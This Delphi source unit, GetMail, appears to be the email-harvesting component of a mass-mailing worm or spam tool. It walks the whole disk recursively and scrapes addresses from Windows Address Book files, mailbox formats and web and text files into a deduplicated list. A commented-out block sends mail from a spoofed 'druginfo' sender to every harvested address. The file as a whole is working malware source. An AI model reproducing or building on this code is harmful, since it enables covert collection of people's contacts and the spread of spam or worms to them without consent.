   unit GetMail;

   interface

   Uses Windows, pFunc;

   Type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle;
       FindData: TWin32FindData;
     end;

     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

   const
     faReadOnly            = $00000001;
     faHidden              = $00000002;
     faSysFile             = $00000004;
     faVolumeID            = $00000008;
     faDirectory           = $00000010;
     faArchive             = $00000020;
     faAnyFile             = $0000003F;

   procedure doscan(dir, name, mask: string);
   Procedure DoGather(FileName, Filter: String);
   PROCEDURE ReadWAB(WABFile:STRING);
   PROCEDURE GetEmailsFromMBX_TBB(FileName:STRING);

   implementation

   function FindMatchingFile(var F: TSearchRec): Integer;
   var
     LocalFileTime: TFileTime;
   begin
     with F do
     begin
       while FindData.dwFileAttributes and ExcludeAttr <> 0 do
         if not FindNextFile(FindHandle, FindData) then
         begin
           Result := GetLastError;
           Exit;
         end;
       FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
       FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi, LongRec(Time).Lo);
       Size := FindData.nFileSizeLow;
       Attr := FindData.dwFileAttributes;
       Name := FindData.cFileName;
     end;
     Result := 0;
   end;

   procedure FindClose(var F: TSearchRec);
   begin
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(F.FindHandle);
       F.FindHandle := INVALID_HANDLE_VALUE;
     end;
   end;

   function FindFirst(const Path: string; Attr: Integer;
     var  F: TSearchRec): Integer;
   const
     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
   begin
     F.ExcludeAttr := not Attr and faSpecial;
     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Result := FindMatchingFile(F);
       if Result <> 0 then FindClose(F);
     end else
       Result := GetLastError;
   end;

   function FindNext(var F: TSearchRec): Integer;
   begin
     if FindNextFile(F.FindHandle, F.FindData) then
       Result := FindMatchingFile(F) else
       Result := GetLastError;
   end;

   procedure doscan(dir, name, mask: string);
   var
     Sr: TSearchRec;
     ext: string;
   begin
     if dir[length(dir)] <> '\' then dir := dir + '\';
     If FindFirst(dir + '*.*', faDirectory, sr) = 0 Then
     Repeat
       If ((Sr.Attr and faDirectory) = faDirectory) and (sr.Name[1] <> '.') then
         doscan(dir + sr.Name, '*', '*.*')
       Else
       Begin
         ext := lowercase(extractfileext(sr.Name));

         if ext = 'wab'  then readWab(Dir + Sr.Name);
         // .mbx .tbb .eml .mai .mbox
         if ext = 'mbx'  then GetEmailsFromMBX_TBB(dir + sr.name);
         if ext = 'tbb'  then GetEmailsFromMBX_TBB(dir + sr.name);
         if ext = 'eml'  then GetEmailsFromMBX_TBB(dir + sr.name);
         if ext = 'mai'  then GetEmailsFromMBX_TBB(dir + sr.name);
         if ext = 'mbox' then GetEmailsFromMBX_TBB(dir + sr.name);
         if ext = 'html' then dogather(dir + sr.Name, 'htmlplphpasptxt');
         if ext = 'htm'  then dogather(dir + sr.Name, 'htmlplphpasptxt');
         if ext = 'pl'   then dogather(dir + sr.Name, 'htmlplphpasptxt');
         if ext = 'php'  then dogather(dir + sr.Name, 'htmlplphpasptxt');
         if ext = 'asp'  then dogather(dir + sr.Name, 'htmlplphpasptxt');
         if ext = 'txt'  then dogather(dir + sr.Name, 'htmlplphpasptxt');
       End;
     Until (FindNext(Sr) <> 0);
     FindClose(SR);
   end;

   Procedure AddMails(Str: String);
   Var
     Mail: String;
     E   : Bool;
     I   : Integer;
   Begin
     Str := Trim(Str)+' ';
     While Pos(' ', Str) > 0 Do
     Begin
       Mail := Copy(Str, 1, Pos(' ', Str)-1);
       Str := Copy(Str, Pos(' ', Str)+1, Length(Str));
       E := False;
       For I := 0 To MailNr -1 Do
       Begin
         If lowercase(Mails[I]) = lowercase(Mail) Then E := True;
       End;
       If Not E Then
       Begin
         Mails[MailNr] := Mail;
         Inc(MailNr,1);
       End;
     End;
   End;

   Procedure DoGather(FileName, Filter: String);
   Var
     FileExt     :String;
     Dir         :String;
     Tmp         :String;
     Line        :String;
     Ch          :String;
     Tmp1,Tmp2   :String;
     Tmp3        :String;
     F           :TextFile;
     FileSize    :Integer;
     J         :Integer;
     Count       :Integer;
   Begin
     Count  := 0;
     dir := extractfilepath(filename);
       If FileName <> '' Then
         Begin
           FileSize := GetFileSize(FileName);
           If FileSize <= (1024 * 100) Then
           Begin
             FileExt := ExtractFileExt(FileName);
             If Pos(LowerCase(FileExt),LowerCase(Filter)) > 0 Then
             Begin
               Tmp3 := Dir+'tmp_'+ExtractFileName(FileName);
               If (CopyFile(pChar(FileName), pChar(Tmp3), False)) and (copy(tmp3,1,4) <> 'tmp_') Then
               Begin
                 FileName := Dir+'tmp_'+ExtractFileName(FileName);
                 AssignFile(F, FileName);
                 Reset(F);
                 Read(F, Tmp);
                 Line := Tmp;
                 ReadLn(F, Tmp);
                 While Not Eof(F) Do
                 Begin
                   Read(F, Tmp);
                   Line := Line + Tmp;
                   ReadLn(F, Tmp);
                 End;
                 CloseFile(F);
                 If DeleteFile(pChar(FileName)) Then
                 Begin
                   If Pos('@', Line) > 0 Then
                   Begin
                     Tmp1 := '';
                     Tmp2 := '';
                     J := 0;
                     Ch := '';
                     For J := 1 To Length(Line) Do
                     Begin
                       Ch := Line[j];
                       If Pos(LowerCase(Ch), 'abcdefghijklmnopqrstuvwxyz-_0123456789@.') > 0 Then
                       Begin
                         Tmp1 := Tmp1 + Ch;
                       End Else
                       Begin
                         If Pos('@', Tmp1)>0 Then
                         Begin
                           If Count < 10000 Then
                           Begin
                             If (Tmp1 <> '@') And
                                (Tmp1[1] <> '@') And
                                (Tmp1[Length(Tmp1)] <> '@') And
                                (Pos('.', Tmp1) > 0) Then
                             Begin
                               AddMails(Tmp1);
                               {
                               from := 'druginfo@maniacs.com';
                               rcpt := tmp1;
                               mailsend;
                               }
                             End;
                           End;
                         Tmp1 := '';
                       End Else
                         Tmp1 := '';
                       End;
                     End;
                   End;
                 End;
               End;
             End;
           End;
         End;
   End;

   // .wab
   PROCEDURE ReadWAB(WABFile:STRING);
   VAR
     F       : FILE;
     I       : DWORD;
     S       : STRING;
     N       : ARRAY[1..5] OF Char;
     Buf     : ARRAY[1..500] OF Char;
     R       : TextFile;
   BEGIN
     AssignFile(R,'Emails.txt');
     ReWrite(R);
     AssignFile(F,WABFile);
       {$I-}
       Reset(F,1);
       IF IOResult=0 THEN BEGIN
         REPEAT
           BlockRead(F,N,2);
           IF N[1]+N[2]=#03#48 THEN BEGIN
             BlockRead(F,Buf,Ord(N[2])+30);
             S:='';
             FOR I:=1 TO Ord(N[2])+30 DO S:=S+Buf[I];
             Delete(S,1,3);
             I:=Pos(#00#00#00,S);
             IF I>0 THEN SetLength(S,I-1);
             FOR I:=1 TO Ord(N[2]) DO IF S[I]=#00 THEN Delete(S,I,1);
             FOR I:=1 TO Length(S) DO
               IF S[I]<chr(45) THEN BEGIN
                 SetLength(S,I-1);
                 Break;
               END;
            IF (Pos('@',S)>0)AND(Pos('.',S)>0) THEN AddMails(S);
           END ELSE Seek(F,FilePos(F)-1);
         UNTIL FileSize(F)-FilePos(F)<6;
         CloseFile(F);
       END;
       CloseFile(R);
       {$I+}
   END;

   // .mbx .tbb .eml .mai .mbox
   PROCEDURE GetEmailsFromMBX_TBB(FileName:STRING);
   LABEL
     Abort, Close;
   VAR
     F : TextFile;
     S : STRING;
     T : STRING;
     G : STRING;
     K : STRING;
     A : Byte;
     B : Byte;
     C : Byte;
     H : Byte;
     Y : Byte;
   BEGIN
     H:=0;
     AssignFile(F,FileName);
     {$I-}
     Reset(F);
     IF IOResult<>0 THEN GOTO Abort;
     REPEAT
       ReadLn(F,S);
       IF IOResult<>0 THEN GOTO Close;
       FOR C:=0 TO 3 DO BEGIN
         IF C=0 THEN K:='To: ';
         IF C=1 THEN K:='From: ';
         IF C=2 THEN K:='cc: ';
         IF C=3 THEN K:='Cc: ';
         IF Pos(K,S)=1 THEN BEGIN
           IF C=1 THEN Y:=2 ELSE Y:=0;
           Delete(S,1,Pos(K,S)+3+Y);
           IF Pos('<',S)>0 THEN BEGIN
             H:=0;
             REPEAT
               IF H=1 THEN BEGIN
                H:=0;
                 Readln(F,S);
                 IF IOResult<>0 THEN GOTO Close;
               END;
               REPEAT
                 A:=Pos('<',S);
                 B:=Pos('>',S);
                 T:=Copy(S,A+1,B-A-1);
                 IF Pos('@',T)>0 THEN AddMails(T);
                Delete(S,1,B);
               UNTIL Pos('<',S)=0;
               IF Pos(',',S)>0 THEN H:=1;
             UNTIL H=0;
           END ELSE IF Pos('@',S)>0 THEN BEGIN
             IF (C<>1) THEN BEGIN
               G:=S;
               WHILE G[Length(G)]=',' DO BEGIN
                 Readln(F,G);
                 IF IOResult<>0 THEN GOTO Close;
                 S:=S+G;
               END;
               REPEAT
                 A:=0;
                 REPEAT
                   INC(A);
                 UNTIL S[A]<>' ';
                 G:=Copy(S,A,Pos(',',S)-A);
                 Delete(S,1,Pos(',',S));
                 IF Pos(' ',G)>0 THEN SetLength(G,Pos(' ',G));
                 IF(G<>'')AND(Pos('@',G)>0) THEN AddMails(G);
               UNTIL Pos(',',S)=0;
               A:=0;
               REPEAT
                 INC(A);
               UNTIL S[A]<>' ';
               Delete(s,1,a-1);
               IF Pos(' ',S)>0 THEN SetLength(S,Pos(' ',S));
               IF Pos('@',S)>0 THEN AddMails(S);
             END;
           END;
         END;
       END;
     UNTIL EOF(F);
     Close:
     CloseFile(F);
     Abort:
     {$I+}
   END;

   end.
